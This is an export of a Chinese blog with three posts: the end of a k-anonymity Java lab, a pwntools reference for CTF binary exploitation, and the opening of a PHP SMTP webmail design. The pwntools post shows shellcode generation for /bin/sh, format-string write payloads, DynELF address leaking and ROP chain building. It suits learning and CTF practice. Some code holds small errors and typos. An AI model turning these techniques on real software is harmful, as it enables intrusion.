</span><br><span class="line">		<span class="comment">//如果k条记录中身高的最大值和最小值相等</span></span><br><span class="line">		<span class="keyword">if</span>(height_min%<span class="number">10</span>==<span class="number">5</span> &amp;&amp; </span><br><span class="line">           height_max%<span class="number">10</span>==<span class="number">5</span> &amp;&amp; </span><br><span class="line">           height_min==height_max) </span><br><span class="line">        &#123;</span><br><span class="line">			height_min=(age_min/<span class="number">10</span>)*<span class="number">10</span>;</span><br><span class="line">			height_max=age_min+<span class="number">5</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		height=height_min+<span class="string">&quot;~&quot;</span>+height_max;</span><br><span class="line"></span><br><span class="line">		temp.setIdNumberFirst(idNumberFirst);</span><br><span class="line">		temp.setSex(sex);</span><br><span class="line">		temp.setAge(age);</span><br><span class="line">		temp.setHeight(height);</span><br><span class="line">		<span class="keyword">return</span> temp; </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>将匿名化后的数据输出到<code>k</code>中，程序结束；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">operation.printResults(results);</span><br><span class="line">System.out.println(<span class="string">&quot;done&quot;</span>);</span><br><span class="line"><span class="comment">//输出匿名化后的结果</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printResults</span><span class="params">(ArrayList&lt;K&gt; results)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	File file=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/k_anonymity/k&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!file.exists()) &#123; </span><br><span class="line">		file.createNewFile();</span><br><span class="line">	&#125;</span><br><span class="line">   	FileWriter writer=<span class="keyword">new</span> <span class="title class_">FileWriter</span>(file);</span><br><span class="line">   	BufferedWriter bufferedWriter=<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(writer);</span><br><span class="line">   	<span class="keyword">for</span> (K k : results) &#123;</span><br><span class="line">		bufferedWriter.write(k.toString());</span><br><span class="line">		bufferedWriter.newLine();</span><br><span class="line">		bufferedWriter.flush();</span><br><span class="line">	&#125;</span><br><span class="line">	bufferedWriter.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>大数据安全实验</category>
      </categories>
      <tags>
        <tag>k-匿名算法</tag>
      </tags>
  </entry>
  <entry>
    <title>pwntools模块总结</title>
    <url>/pwntools%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>pwntools 是一款专门用于CTF二进制Exploit编写的python库；<span id="more"></span></p>
<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><h2 id="环境变量设置"><a href="#环境变量设置" class="headerlink" title="环境变量设置"></a>环境变量设置</h2><p>由于二进制文件运行环境不同，需要进行环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同；</p>
<p>环境变量有目标架构、操作系统、字长、字节序，设置方式如下：</p>
<ul>
<li><p>通过设置全局变量<code>context</code>一次性进行设置、同时也可以设置：目标架构、操作系统、字长、字节序；</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.clear() 				<span class="comment"># 清空context</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.arch      = <span class="string">'i386'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.os        = <span class="string">'linux'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.endian    = <span class="string">'little'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.word_size = <span class="number">32</span></span><br></pre></td></tr></table></figure></li>
<li><p>直接通过<code>context</code>这个函数来一次性设置所有需要设置的参数；</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'nop'</span>)</span><br><span class="line"><span class="string">'\x90'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context(arch=<span class="string">'arm'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'big'</span>, word_size=<span class="number">32</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'nop'</span>)</span><br><span class="line"><span class="string">'\xe3 \xf0\x00'</span></span><br></pre></td></tr></table></figure></li>
<li><p>将目标体系结构指定为函数定义的参数；</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'nop'</span>)</span><br><span class="line"><span class="string">'\x90'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'nop'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="string">'\x00\xf0 \xe3'</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="连接及信息传输"><a href="#连接及信息传输" class="headerlink" title="连接及信息传输"></a>连接及信息传输</h2><p>要进行漏洞利用，首先就需要与程序进行通信，pwntools提供的函数能够与本地或远程进行通信；</p>
<h3 id="process-本地交互"><a href="#process-本地交互" class="headerlink" title="process()本地交互"></a><code>process()</code>本地交互</h3><p>使用<code>process()</code>函数创建了一个进程对象p，创建进程对象p之后可以使用它进行一系列的输入输出交互；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process([<span class="string">'filename'</span>, <span class="string">'argv_1'</span>, <span class="string">'argv_2'</span>, …], cwd=<span class="string">"working_directory"</span>)</span><br><span class="line">eg.</span><br><span class="line">p = process(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.clean()	<span class="comment"># 清空消息缓存</span></span><br></pre></td></tr></table></figure>

<h3 id="remote-远程交互"><a href="#remote-远程交互" class="headerlink" title="remote()远程交互"></a><code>remote()</code>远程交互</h3><p>使用<code>remote()</code>函数创建了一个进程对象<code>conn</code>进行socket通信；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">conn = remote(<span class="string">'ip_address'</span>, port_num)</span><br></pre></td></tr></table></figure>

<p><code>Ip_address</code>可以是IP、域名或者本地0；</p>
<h3 id="ssh-登陆并执行命令行"><a href="#ssh-登陆并执行命令行" class="headerlink" title="ssh()登陆并执行命令行"></a><code>ssh()</code>登陆并执行命令行</h3><p>pwntools同时提供ssh连接方式；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = ssh(host=<span class="string">'ip_address'</span>, user=<span class="string">'username'</span>, port=port_num, password=<span class="string">'password'</span>)</span><br><span class="line"><span class="comment"># 创建进程</span></span><br><span class="line">c = s.process(<span class="string">'command'</span>)</span><br><span class="line"><span class="comment"># 和正常的本地进程交互相同，可以接收、发送数据</span></span><br><span class="line">c.recv()</span><br><span class="line">c.send()</span><br><span class="line"><span class="comment"># 同时可以使用nc打开另外一个连接通道</span></span><br><span class="line">nc = s.run(<span class="string">'nc 127.0.0.1 8888'</span>) 	<span class="comment"># run()和process()功能相同</span></span><br></pre></td></tr></table></figure>

<h3 id="listen-本地监听"><a href="#listen-本地监听" class="headerlink" title="listen()本地监听"></a><code>listen()</code>本地监听</h3><p>pwntools提供<code>listen()</code>函数开启本地的监听端口；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = listen()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = remote(<span class="string">'localhost'</span>, l.lport)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn = l.wait_for_connection()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.send(<span class="string">'hello'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn.recv()</span><br><span class="line"><span class="string">'hello'</span></span><br></pre></td></tr></table></figure>

<h3 id="数据接收"><a href="#数据接收" class="headerlink" title="数据接收"></a>数据接收</h3><p>实现数据的接收，首先建立起一个具备交互的对象，然后调用接收函数<code>recv()</code>、<code>recvline()</code>、<code>recvuntil()</code>接收数据；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">conn = process(<span class="string">'file_path'</span>)</span><br><span class="line">conn.recv(<span class="number">256</span>, timeout = default)			<span class="comment"># 接收到缓冲区中的256bytes的信息</span></span><br><span class="line">conn.recvline(keepends=<span class="literal">True</span>)				<span class="comment"># 接受一行数据，keepends为是否保留行尾的'\n'</span></span><br><span class="line">conn.recvuntil(<span class="string">'string'</span>, drop=fasle)		<span class="comment"># 接收数据直到'string'出现才会执行下一行代码</span></span><br><span class="line">conn.recvall()								<span class="comment"># 一直接收直到 EOF</span></span><br><span class="line">conn.recvrepeat(timeout = default)			<span class="comment"># 持续接受直到EOF或timeout</span></span><br><span class="line">conn.clear()								<span class="comment"># 清空消息缓存</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接进行交互，相当于回到shell的模式，在取得shell之后使用</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="数据发送"><a href="#数据发送" class="headerlink" title="数据发送"></a>数据发送</h3><p>与数据接收类似；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">conn = process(<span class="string">'file_path'</span>)</span><br><span class="line">conn.send(data)				<span class="comment"># 发送data数据</span></span><br><span class="line">conn.sendline(data)			<span class="comment"># 在data数据后自动添加一个'\n'换行符</span></span><br></pre></td></tr></table></figure>

<h2 id="打包与解包"><a href="#打包与解包" class="headerlink" title="打包与解包"></a>打包与解包</h2><p>在漏洞利用的过程当中，往往需要将输入的payload转化成8位、16位、32位或64位、大端或小端所对应格式；</p>
<p>pwntools提供了一组函数用来对给定的数据按照一定的格式进行打包和解包，这些函数以p或u为开头，后面加上一个数字代表位数；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打包一个整数，即将一个数字转换为字符</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p8(<span class="number">0xde</span>)</span><br><span class="line"><span class="string">'\xde'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p16(<span class="number">0xdead</span>)</span><br><span class="line"><span class="string">'\xad\xde'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="string">'\xef\xbe\xad\xde'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="string">'\xef\xbe\xad\xde\x00\x00\x00\x00'</span></span><br><span class="line"><span class="comment"># 由于linux编译的程序是小端序的，所以转换后的顺序是反的</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解包一个字符串，得到整数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u8(<span class="string">'\xde'</span>))</span><br><span class="line"><span class="string">'0xde'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u16(<span class="string">'\xad\xde'</span>))</span><br><span class="line"><span class="string">'0xdead'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u32(<span class="string">'\xef\xbe\xad\xde'</span>))</span><br><span class="line"><span class="string">'0xdeadbeef'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u64(<span class="string">'\xef\xbe\xad\xde\x00\x00\x00\x00'</span>))</span><br><span class="line"><span class="string">'0xdeadbeef'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u64(<span class="string">'\x00\x00\x00\x00\xef\xbe\xad\xde'</span>))</span><br><span class="line"><span class="string">'0xdeadbeef00000000'</span></span><br></pre></td></tr></table></figure>

<h2 id="汇编与反汇编"><a href="#汇编与反汇编" class="headerlink" title="汇编与反汇编"></a>汇编与反汇编</h2><p>pwntools提供了<code>asm()</code>和<code>disasm()</code>两个函数进行汇编和反汇编的转换；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'mov eax, 0'</span>)</span><br><span class="line"><span class="string">'\xb8\x00\x00\x00\x00'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'mov eax, 0'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'b800000000'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> disasm(<span class="string">'\xb8\x00\x00\x00\x00'</span>)</span><br><span class="line">   <span class="number">0</span>:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    eax, <span class="number">0x0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> disasm(<span class="string">'6a0258cd80ebf9'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">   <span class="number">0</span>:   6a 02                   push   <span class="number">0x2</span></span><br><span class="line">   <span class="number">2</span>:   <span class="number">58</span>                      pop    eax</span><br><span class="line">   <span class="number">3</span>:   cd <span class="number">80</span>                   <span class="built_in">int</span>    <span class="number">0x80</span></span><br><span class="line">   <span class="number">5</span>:   eb f9                   jmp    <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<h2 id="ELF文件解析"><a href="#ELF文件解析" class="headerlink" title="ELF文件解析"></a>ELF文件解析</h2><p>在漏洞利用脚本的编写过程中，经常需要使用<strong>got表地址</strong>、<strong>plt表地址</strong>、或是<strong>system函数在libc中的偏移</strong>；</p>
<p>pwntool的FLE模块能够快速找到相应的地址；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">'bin-path'</span>)		<span class="comment"># 加载二进制文件</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.address					<span class="comment"># 文件装载的基地址</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.got[<span class="string">'fun_name'</span>] 		<span class="comment"># 获取对应函数的got表地址</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.plt[<span class="string">'fun_name'</span>] 		<span class="comment"># 获取对应函数的plt表地址</span></span><br><span class="line"><span class="comment"># eg.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">'/bin/bash'</span>)</span><br><span class="line">[*] <span class="string">'/bin/bash'</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.address)</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.symbols[<span class="string">'write'</span>])</span><br><span class="line"><span class="number">0x2c0a0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.got[<span class="string">'write'</span>])</span><br><span class="line"><span class="number">0x306988</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.plt[<span class="string">'write'</span>])</span><br><span class="line"><span class="number">0x2c0a0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同样，也可以打开一个libc.so来解析其中system的位置</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>libc = ELF(<span class="string">'libc-path'</span>)		<span class="comment"># 加载二进制文件</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>libc.symbols[<span class="string">'system'</span>]		<span class="comment"># 获取函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改ELF文件代码</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">'/bin/cat'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.read(e.address+<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="string">'ELF'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.asm(e.address, <span class="string">'ret'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.save(<span class="string">'/tmp/quiet-cat'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>disasm(file(<span class="string">'/tmp/quiet-cat'</span>,<span class="string">'rb'</span>).read(<span class="number">1</span>))</span><br><span class="line"><span class="string">'   0:   c3                      ret'</span></span><br></pre></td></tr></table></figure>

<h2 id="DynEFL泄漏函数地址"><a href="#DynEFL泄漏函数地址" class="headerlink" title="DynEFL泄漏函数地址"></a>DynEFL泄漏函数地址</h2><p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块；</p>
<p>在没有目标系统libc文件的情况下，可以使用DynELF模块来泄漏地址信息，从而获取到shell；</p>
<p>在没有目标系统libc文件的情况下，DynEFL函数能够解析动态链接的ELF二进制文件的符号，给定一个函数可以泄漏任意地址信息，DynEFL函数进而能够解析加载的库中任意符号，使用lookup方法用来寻找函数符号的地址；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">'bin-path'</span>)</span><br><span class="line">elf = EFL(<span class="string">'bin-path'</span>)</span><br><span class="line"><span class="comment"># 声明一个只包含一个地址参数的函数leak()</span></span><br><span class="line"><span class="comment"># 并且这个函数能够泄漏至少位于这个地址的一字节的数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak,elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="FmtStr格式化字符串"><a href="#FmtStr格式化字符串" class="headerlink" title="FmtStr格式化字符串"></a>FmtStr格式化字符串</h2><p>在格式化字符串利用中，攻击者往往需要通过漏洞实现任意内存地址写，但构造合适的payload往往需要占用大量的时间；</p>
<p>FmtStr模块中实现了和格式化字符串漏洞利用相关的多个函数，极大的加速了漏洞利用脚本的开发速度；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten, write_size)</span><br><span class="line"><span class="comment"># eg.</span></span><br><span class="line">fmtstr_payload(<span class="number">5</span>, {<span class="number">0x8041337</span>:<span class="number">0xdeadbeef</span>}, write_size=<span class="string">'short'</span>)</span><br><span class="line"><span class="comment"># 生成一段payload实现修改0x8041337地址内容为 0xdeadbeef</span></span><br></pre></td></tr></table></figure>

<h2 id="ShellCraft构造shellcode"><a href="#ShellCraft构造shellcode" class="headerlink" title="ShellCraft构造shellcode"></a>ShellCraft构造shellcode</h2><p>shellcraft模块包含一些生成shellcode的函数，用于生成shellcode；</p>
<p>其中的子模块声明架构，比如shellcraft.arm是ARM架构的、shellcraft.amd64是AMD64架构、shellcraft.i386是Intel 80386架构的、以及有一个shellcraft.common是所有架构通用的；</p>
<p>有时需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持：<br>首先，常用的，也是最简单的shellcode，即调用<code>/bin/sh</code>可以通过shellcraft得到；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> shellcraft.sh()	<span class="comment"># 打印出shellcode</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())	<span class="comment"># 汇编后的shellcode</span></span><br></pre></td></tr></table></figure>

<p>由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context；</p>
<h2 id="ROP链构造"><a href="#ROP链构造" class="headerlink" title="ROP链构造"></a>ROP链构造</h2><p>ROP原理：由于NX开启不能在栈上执行shellcode，但是可以在栈上布置一系列的返回地址与参数，这样可以进行多次的函数调用，通过函数尾部的ret语句控制程序的流程，而用程序中的一些<code>pop/ret</code>的代码块(称之为gadget)来平衡堆栈。其完成的事情无非就是放上<code>/bin/sh</code>，覆盖程序中某个函数的GOT为system的，然后ret到那个函数的plt就可以触发<code>system('/bin/sh')</code>。由于是利用ret指令的exploit，所以叫Return-Oriented Programming（如果没有开启ASLR，可以直接使用ret2libc技术）。</p>
<p>实现ROP的难点是如何在栈上布置返回地址以及函数参数；</p>
<p>而ROP模块的作用，是自动地寻找程序里的gadget，自动在栈上部署对应的参数；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">'ropasaurusrex'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rop = ROP(elf)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rop.read(<span class="number">0</span>, elf.bss(<span class="number">0x80</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rop.dump()</span><br><span class="line">  [<span class="string">'0x0000:        0x80482fc (read)'</span>,</span><br><span class="line">   <span class="string">'0x0004:       0xdeadbeef'</span>,</span><br><span class="line">   <span class="string">'0x0008:              0x0'</span>,</span><br><span class="line">   <span class="string">'0x000c:        0x80496a8'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(rop)</span><br><span class="line">  <span class="string">'\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08'</span></span><br></pre></td></tr></table></figure>

<p>使用<code>ROP(elf)</code>来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数；</p>
<p>因为ROP对象实现了<code>__getattr__</code>的功能，可以直接通过<code>func call</code>的形式来添加函数；</p>
<p><code>rop.read(0, elf.bss(0x80))</code>实际相当于<code>rop.call('read', (0, elf.bss(0x80)))</code>；</p>
<p>通过多次添加函数调用，最后使用str将整个rop链dump出来就可以了；</p>
<ul>
<li>  <code>call(resolvable, arguments=())</code>：添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)；</li>
<li>  <code>chain()</code>：返回当前的字节序列，即payload；</li>
<li>  <code>dump()</code>：直观地展示出当前的rop链；</li>
<li>  <code>raw()</code>：在rop链中加上一个整数或字符串；</li>
<li>  <code>search(move=0, regs=None, order=’size’)</code>：按特定条件搜索gadget，没仔细研究过；</li>
<li>  <code>unresolve(value)</code>：给出一个地址，反解析出符号；</li>
</ul>
<h2 id="cyclic字符串生成"><a href="#cyclic字符串生成" class="headerlink" title="cyclic字符串生成"></a>cyclic字符串生成</h2><p>可以按照一定规律生成指定长度的字符串，这个是一个在栈溢出或者各种需要找偏移的时候比较有用的函数；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic(<span class="number">30</span>)		<span class="comment"># 生成长度为30字节的字符串</span></span><br><span class="line"><span class="string">'aaaabaaacaaadaaaeaaafaaagaaaha'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic_find(<span class="string">'abcd'</span>)		<span class="comment"># 寻找字符串'abcd'的偏移</span></span><br><span class="line"><span class="number">2807</span></span><br></pre></td></tr></table></figure>

<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>pwntools提供了用于在程序运行中调用gdb的函数，配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(target, gdbscript = <span class="literal">None</span>, exe = <span class="literal">None</span>, arch = <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>  target为所要调试的进程；</li>
<li>  gdbscript为gdb脚本字符串，在启动gdb时，会先执行该脚本；</li>
<li>  exe为所调试进程的二进制文件路径；</li>
<li>  arch为架构；</li>
</ul>
<p>一般情况下，只需要使用前两个参数即可。</p>
<h2 id="DEBUG日志"><a href="#DEBUG日志" class="headerlink" title="DEBUG日志"></a>DEBUG日志</h2><p>当context.log_level被设置为 “DEBUG”，输入和输出会被直接输出，显示栈信息；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br></pre></td></tr></table></figure>

<p>参考：</p>
<p>​    <a href="https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/intro.html">https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/intro.html</a></p>
<p>​    <a href="http://brieflyx.me/2015/python-module/pwntools-intro/">http://brieflyx.me/2015/python-module/pwntools-intro/</a></p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>pwntools</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>simple webmail</title>
    <url>/simple-webmail.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ol>
<li>提供一个浏览器界面，可以实现基本的邮件头（发件人、收件人、主题等）输入和邮件内容编辑功 能；</li>
<li>作为Web服务器，接收来自浏览器的TCP连接请求，接收邮件数据，并保存在文件中；<span id="more"></span></li>
<li>作为SMTP客户端，建立到实际邮件服务器的TCP连接，发送SMTP命令，将保存的邮件发送给实际邮件服务器；</li>
<li>支持一封邮件多个接收者，要求接收者属于不同的域，如bupt.edu.cn, 163.com, qq.com,…；</li>
<li>提供发件人和收件人Email地址格式检查功能，例如下列邮件地址是错误的：chengli、 chengli@、bupt.edu.cn, ….；</li>
<li>根据实际邮件服务器的响应码，显示错误信息，如用户名不存在等；</li>
</ol>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ol>
<li>编程语言：PHP+HTML+Javascript</li>
<li>服务器环境：PhpStudy v8.1(Apache2.4.39+php5.6.9+mysql5.7.26)</li>
</ol>
<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>数据结构是整个程序的要点之一，程序维护者充分了解数据结构就可以对主要算法和处理流程有个基本 的理解。下面描述程序中定义的全局变量和函数中的变量的变量名和变量所起的作用以及程序定义的标 识符含义；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Public Variables */</span> </span><br><span class="line"><span class="keyword">var</span> <span class="variable">$smtpemailto</span>; <span class="comment">//收件人邮箱 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$mailbody</span>; <span class="comment">//邮件内容 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$mailsubject</span>; <span class="comment">//邮件主题 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$smtpusermail</span>; <span class="comment">//SMTP服务器的用户邮箱 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$smtpserver</span>; <span class="comment">//SMTP服务器 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$smtpserverport</span>;<span class="comment">//SMTP服务器端口 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$smtpuser</span>; <span class="comment">//SMTP服务器的用户帐号 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$smtppass</span>; <span class="comment">//SMTP服务器的用户密码 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$mailtype</span>; <span class="comment">//邮件格式（HTML/TXT）,TXT为文本邮件 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$client_ip</span>; <span class="comment">//客户端IP </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$client_port</span>; <span class="comment">//客户端端口号 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$server_ip</span>; <span class="comment">//服务器IP</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$server_port</span>; <span class="comment">//服务器端口 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$smtp_port</span>; <span class="comment">//SMTP端口 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$header</span>; <span class="comment">//邮件头 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$message</span>; <span class="comment">//邮件内容 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$time_out</span>; <span class="comment">//过期时间 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$host_name</span>; <span class="comment">//三次握手需要用到 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$relay_host</span>; <span class="comment">//SMTP服务器 </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$debug</span>; <span class="comment">//是否debug </span></span><br><span class="line"><span class="keyword">var</span> <span class="variable">$auth</span>; <span class="comment">//身份验证，需要为true </span></span><br><span class="line"><span class="comment">/* Private Variables */</span> </span><br><span class="line"><span class="keyword">var</span> <span class="variable">$sock</span>; <span class="comment">//sock连接</span></span><br></pre></td></tr></table></figure>

<h3 id="模块结构"><a href="#模块结构" class="headerlink" title="模块结构"></a>模块结构</h3><h4 id="函数功能"><a href="#函数功能" class="headerlink" title="函数功能"></a>函数功能</h4><ol>
<li><p>function smtp() ——构造结构 </p>
<p>功能：构造邮件传输需要的变量 </p>
</li>
<li><p>function sendmail() ——主函数 </p>
<ul>
<li>功能：构造邮件头，调用子函数实现消息发送；</li>
<li>参数<ul>
<li>to：收件人 </li>
<li>from：发件人 </li>
<li>subject：邮件主题 </li>
